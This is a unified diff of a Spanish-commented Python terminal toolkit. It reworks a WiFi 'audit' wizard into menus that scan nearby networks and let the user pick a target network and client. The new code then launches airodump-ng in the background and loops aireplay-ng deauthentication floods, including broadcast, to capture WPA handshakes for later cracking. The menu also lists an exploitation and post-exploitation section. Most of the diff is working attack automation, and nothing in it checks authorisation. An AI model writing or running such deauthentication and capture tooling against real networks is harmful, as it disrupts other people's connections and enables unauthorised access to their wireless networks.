@@ -335,6 +335,7 @@ def generar_menu_interfaces():
 
     return menu
 
+
 # ==========================================
 # GESTIÓN DE AUDITORÍA INALÁMBRICA (WIFI)
 # ==========================================
@@ -349,7 +350,7 @@ def habilitar_modo_monitor(interfaz):
 def generar_menu_monitor():
     """Genera menú con interfaces disponibles para poner en modo monitor"""
     menu = Menu("ACTIVAR MODO MONITOR")
-    interfaces = obtener_interfaces() # Reutilizamos la función de macchanger
+    interfaces = obtener_interfaces() 
     if not interfaces:
         menu.agregar_opcion("No se encontraron interfaces", AccionBash("Error", "echo 'No hay interfaces de red detectadas.'"))
         return menu
@@ -357,39 +358,81 @@ def generar_menu_monitor():
         menu.agregar_opcion(f"Poner {iface} en modo monitor", AccionPython(f"Monitor {iface}", habilitar_modo_monitor, iface))
     return menu
 
-def wizard_captura_handshake():
-    """Ejecuta la captura interactiva sin requerir teclear BSSIDs o MACs"""
-    interfaces = obtener_interfaces()
-    print("=== ASISTENTE DE CAPTURA DE HANDSHAKE ===")
-    print("Interfaces disponibles:")
-    for i, iface in enumerate(interfaces):
-        print(f"[{i}] {iface}")
-    
-    try:
-        idx_iface = int(input("\n[-] Selecciona el número de tu interfaz en modo monitor: "))
-        interfaz = interfaces[idx_iface]
-    except (ValueError, IndexError):
-        print("[-] Selección inválida.")
-        return
+# --- NUEVA LÓGICA DE CAPTURA CON MENÚS DINÁMICOS Y SIN GUI ---
 
-    # Escaneo rápido para recolectar BSSIDs
-    print(f"\n[*] Iniciando escaneo rápido de 10 segundos en {interfaz}...")
+def lanzar_ataque_captura(interfaz, target, station):
+    """Callback final: Ejecuta la captura en background y la desautenticación en foreground"""
+    print(f"[*] Preparando entorno de ataque para: {target['essid']} (BSSID: {target['bssid']})")
+    print(f"[*] Cliente objetivo: {station}")
+
+    timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
+    session_dir = f"{BASE_DIR_WIFI}/Auditoria-{timestamp}"
+    os.makedirs(session_dir, exist_ok=True)
+
+    print(f"\n[*] Iniciando airodump-ng en segundo plano (sin GUI)...")
+    print(f"[*] Los archivos de captura se guardarán en: {session_dir}/Captura")
+    
+    # Lanzamos airodump-ng en background (&) y redirigimos su salida para no ensuciar la terminal
+    comando_airodump = f"sudo airodump-ng --channel {target['ch']} --bssid {target['bssid']} -w {session_dir}/Captura {interfaz} > /dev/null 2>&1 &"
+    os.system(comando_airodump)
+
+    time.sleep(2) # Darle 2 segundos a airodump para que empiece a escuchar en el canal correcto
+
+    try:
+        # Bucle de ataque
+        while True:
+            print(f"\n[*] Enviando paquetes de desautenticación a {station}...")
+            os.system(f"sudo aireplay-ng -0 9 -a {target['bssid']} -c {station} {interfaz}")
+
+            repetir = input("\n[?] ¿Desea volver a enviar paquetes de desautenticación? (y/n): ").strip().lower()
+            if repetir != 'y':
+                break
+    finally:
+        print("\n[*] Deteniendo el proceso de airodump-ng en segundo plano...")
+        # Buscamos y matamos especificamente el airodump de esta red
+        os.system(f"sudo pkill -f 'airodump-ng --channel {target['ch']} --bssid {target['bssid']}'")
+
+    print(f"\n[+] Auditoría finalizada. Revisa la carpeta {session_dir}/ para los Handshakes.")
+
+def generar_menu_clientes(interfaz, target, clientes_objetivo):
+    """Submenú 3: Seleccionar cliente a desautenticar"""
+    menu = Menu(f"CLIENTES EN: {target['essid'][:10]}")
+    
+    menu.agregar_opcion("=> Enviar a todos (Broadcast FF:FF:FF:FF:FF:FF) <=", 
+                        AccionPython("Broadcast", lanzar_ataque_captura, interfaz, target, "FF:FF:FF:FF:FF:FF"))
+
+    if not clientes_objetivo:
+        menu.agregar_opcion("[No se detectaron clientes. Solo puedes usar Broadcast]", 
+                            AccionBash("Info", "echo 'Elige la opción Broadcast'"))
+    else:
+        for c_mac in clientes_objetivo:
+            menu.agregar_opcion(f"Desautenticar cliente: {c_mac}", 
+                                AccionPython(f"Ataque {c_mac}", lanzar_ataque_captura, interfaz, target, c_mac))
+    return menu
+
+def escaneo_y_generar_menu_redes(interfaz):
+    """Submenú 2: Escanear el entorno por 10s y generar menú con las redes encontradas"""
+    # Pausamos TUI para mostrar el progreso de los 10 segundos
+    curses.endwin()
+    os.system('clear')
+    print(f"[*] Iniciando escaneo silencioso de 10 segundos en {interfaz}...")
+    print("[*] Por favor, espera y no presiones ninguna tecla...")
+
     scan_base = "/tmp/wifi_scan"
     os.system(f"sudo rm -f {scan_base}-01.csv")
     
-    # timeout detiene airodump-ng tras 10 segundos
+    # Escaneo de 10 segundos
     os.system(f"sudo timeout 10s airodump-ng {interfaz} -w {scan_base} --output-format csv > /dev/null 2>&1")
 
     redes = []
     clientes = []
     
-    # Parseo del CSV de Airodump
+    # Parseo del CSV
     try:
         with open(f"{scan_base}-01.csv", "r", encoding="utf-8", errors="ignore") as f:
             contenido = f.read()
             partes = contenido.split("Station MAC,")
             
-            # Extraer Redes (APs)
             lineas_redes = partes[0].split("\n")[2:] 
             for linea in lineas_redes:
                 row = linea.split(",")
@@ -400,7 +443,6 @@ def wizard_captura_handshake():
                         "essid": row[13].strip() if row[13].strip() else "<Oculta>"
                     })
                     
-            # Extraer Clientes (Stations)
             if len(partes) > 1:
                 lineas_clientes = partes[1].split("\n")[1:]
                 for linea in lineas_clientes:
@@ -411,64 +453,38 @@ def wizard_captura_handshake():
                             "bssid": row[5].strip()
                         })
     except Exception as e:
-        print(f"[-] Error leyendo el escaneo: {e}")
-        return
+        menu_err = Menu("ERROR DE ESCANEO")
+        menu_err.agregar_opcion(f"Error al leer: {e}", AccionBash("Error", f"echo '{e}'"))
+        return menu_err
 
     if not redes:
-        print("[-] No se encontraron redes en los alrededores.")
-        return
+        menu_vacio = Menu("RESULTADOS DEL ESCANEO")
+        menu_vacio.agregar_opcion("No se encontraron redes. (Regresar)", AccionBash("Vacío", "echo 'Intenta acercarte al objetivo o revisar tu antena.'"))
+        return menu_vacio
 
-    print("\n[-] Redes encontradas:")
-    for i, red in enumerate(redes):
-        print(f"[{i}] {red['essid']} (BSSID: {red['bssid']} | Canal: {red['ch']})")
+    menu_redes = Menu("SELECCIONAR RED OBJETIVO")
+    for red in redes:
+        clientes_red = [c["mac"] for c in clientes if c["bssid"] == red["bssid"]]
+        texto_opcion = f"{red['essid']} (CH:{red['ch']} | BSSID:{red['bssid']} | Clientes:{len(clientes_red)})"
+        # Usamos lambda inyectando las variables actuales para no solapar los valores en el bucle
+        menu_redes.agregar_opcion(texto_opcion, 
+                                  AccionMenuDinamico(f"Red {red['essid']}", lambda i=interfaz, r=red, c=clientes_red: generar_menu_clientes(i, r, c)))
+    return menu_redes
 
-    try:
-        idx_red = int(input("\n[-] Selecciona el número de la red a auditar: "))
-        target = redes[idx_red]
-    except (ValueError, IndexError):
-        print("[-] Selección inválida.")
-        return
+def generar_menu_interfaces_captura():
+    """Submenú 1: Seleccionar la interfaz para iniciar el Wizard"""
+    menu = Menu("SELECCIONAR INTERFAZ PARA CAPTURA")
+    interfaces = obtener_interfaces()
 
-    # Filtrar clientes asociados a esta red
-    clientes_objetivo = [c["mac"] for c in clientes if c["bssid"] == target["bssid"]]
-    
-    station = "FF:FF:FF:FF:FF:FF" # Por defecto Broadcast
-    if clientes_objetivo:
-        print("\n[-] Clientes conectados detectados:")
-        print("[0] Enviar a todos (Broadcast FF:FF:FF:FF:FF:FF)")
-        for i, c_mac in enumerate(clientes_objetivo, 1):
-            print(f"[{i}] {c_mac}")
-        
-        try:
-            idx_cliente = int(input("\n[-] Selecciona el número del cliente a desautenticar: "))
-            if idx_cliente > 0:
-                station = clientes_objetivo[idx_cliente - 1]
-        except (ValueError, IndexError):
-            pass
-    else:
-        print("\n[!] No se detectaron clientes. Se enviarán paquetes Broadcast.")
+    if not interfaces:
+        menu.agregar_opcion("No se encontraron interfaces", AccionBash("Error", "echo 'No se detectaron interfaces.'"))
+        return menu
 
-    # Crear carpeta dinámica de sesión
-    timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
-    session_dir = f"{BASE_DIR_WIFI}/Auditoria-{timestamp}"
-    os.makedirs(session_dir, exist_ok=True)
+    for iface in interfaces:
+        menu.agregar_opcion(f"Usar {iface}", AccionMenuDinamico(f"Escaneando {iface}", lambda i=iface: escaneo_y_generar_menu_redes(i)))
 
-    print(f"\n[*] Abriendo airodump-ng en 'kitty' para capturar el handshake...")
-    comando_airodump = f"kitty --hold bash -c 'sudo airodump-ng --channel {target['ch']} --bssid {target['bssid']} -w {session_dir}/Captura {interfaz}; exec bash' 2>/dev/null &"
-    os.system(comando_airodump)
+    return menu
 
-    # Bucle de desautenticación
-    time.sleep(2) # Darle tiempo a kitty de abrir
-    while True:
-        print(f"\n[*] Lanzando ataque de desautenticación a {station}...")
-        os.system(f"sudo aireplay-ng -0 9 -a {target['bssid']} -c {station} {interfaz}")
-
-        repetir = input("\n[?] ¿Desea volver a enviar paquetes? (y/n): ").strip().lower()
-        if repetir != 'y':
-            break
-
-    print(f"\n[+] Auditoría finalizada. Handshakes guardados en {session_dir}/")
-    os.system("pkill -f 'kitty.*airodump-ng'") 
 
 # ==========================================
 # EXPLORADOR DE HANDSHAKES
@@ -565,10 +581,8 @@ def main(stdscr):
 
     menu_wireless = Menu("AUDITORÍA INALÁMBRICA (WiFi)")
     menu_wireless.agregar_opcion("1. Activar Modo Monitor (Seleccionar Interfaz)", AccionMenuDinamico("Modo Monitor", generar_menu_monitor))
-    menu_wireless.agregar_opcion("2. Iniciar Captura Automatizada de Handshake", AccionPython("Captura WiFi", wizard_captura_handshake))
+    menu_wireless.agregar_opcion("2. Iniciar Captura Automatizada de Handshake", AccionMenuDinamico("Seleccionar Interfaz", generar_menu_interfaces_captura))
     menu_wireless.agregar_opcion("3. Explorador de Capturas (Visor TUI y Ranger)", AccionMenuDinamico("Explorador WiFi", generar_menu_carpetas_wifi))
-
-
 
 
     menu_explotacion = Menu("EXPLOTACIÓN Y POST-EXPLOTACIÓN") 
